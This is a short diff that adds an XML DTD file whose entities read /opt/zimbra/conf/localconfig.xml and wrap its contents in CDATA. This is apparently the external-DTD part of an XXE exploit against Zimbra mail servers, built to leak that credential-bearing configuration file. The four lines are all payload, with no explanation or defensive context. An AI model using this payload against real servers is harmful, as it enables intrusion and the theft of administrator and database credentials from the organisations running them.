@@ -1,0 +1,4 @@
+<!ENTITY % gf SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % s "<![CDATA[">
+<!ENTITY % e "]]>">
+<!ENTITY % a "<!ENTITY wf '%s;%gf;%e;'>">
